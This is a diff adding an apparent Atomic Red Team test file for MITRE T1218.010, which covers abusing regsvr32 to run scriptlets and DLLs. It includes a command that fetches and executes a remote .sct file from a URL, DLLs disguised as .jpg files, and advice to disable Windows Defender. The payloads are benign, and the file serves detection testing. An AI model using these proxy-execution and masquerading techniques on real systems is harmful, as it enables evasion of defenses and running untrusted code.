@@ -1,0 +1,80 @@
+attack_technique: T1218.010
+display_name: Abusing Regsvr32
+atomic_tests: 
+- name: Execute local .SCT script with scrobj.dll
+  auto_generated_guid: 55d09c84-81d8-4f9e-95bc-3ec10b2332b5
+  description: This test executes a .sct sctipt that when executed opens notepad.exe note (.SCT file does not need to end in .SCT)
+
+  supported_platforms:
+  - windows
+  input_arguments:
+    sct_file:
+      description: a .SCT script that opens notepad.exe
+      type: path
+      default: PathToAtomicsFolder\Regsvr32_anomalies\sct_file.jpg
+  dependency_executor_name: powershell
+  dependencies:
+  - description: The .SCT file to execute
+    prereq_command: if (Test-Path "#{sct_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host "to be done after github"
+  executor:
+    command: regsvr32.exe /s /u /i:"#{sct_file}" scrobj.dll
+    name: powershell
+    elevation_required: true
+- name: Regsvr32 remote COM scriptlet execution
+  auto_generated_guid: c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36
+  description: |
+    Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable
+    windows defender real-time protection to fix it. Upon execution, calc.exe will be launched.
+  supported_platforms:
+  - windows
+  input_arguments:
+    url:
+      description: URL to hosted sct file
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct #Add Inova link
+  executor:
+    command: |
+      regsvr32 /s /u /i:#{url} scrobj.dll
+    name: command_prompt
+- name: Execute a dll file
+  auto_generated_guid: 214d4cf6-4113-4243-a8d0-a3541a3b36f0
+  description: This test runs a dll file under the Regsvr32 process
+  supported_platforms:
+  - windows
+  input_arguments:
+    dll_file:
+      description: a dll file to execute
+      type: path
+      default: PathToAtomicsFolder\Regsvr32_anomalies\meow.dll
+  dependency_executor_name: powershell
+  dependencies:
+  - description: The dll file to execute
+    prereq_command: if (Test-Path "#{dll_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host "to be done after github"
+  executor:
+    command: regsvr32.exe "#{dll_file}"
+    name: powershell
+    elevation_required: true
+- name: Execute a dll file disguised as a jpg
+  auto_generated_guid: 70433186-a23c-4206-96d0-1d4c1a809ce2
+  description: This test runs a dll file under the Regsvr32 process the dll file is disguised as a jpg
+  supported_platforms:
+  - windows
+  input_arguments:
+    dll_file:
+      description: a dll file to execute
+      type: path
+      default: PathToAtomicsFolder\Regsvr32_anomalies\dll_file.jpg
+  dependency_executor_name: powershell
+  dependencies:
+  - description: The dll file to execute
+    prereq_command: if (Test-Path "#{dll_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host "to be done after github"
+  executor:
+    command: regsvr32.exe "#{dll_file}"
+    name: powershell
+    elevation_required: true
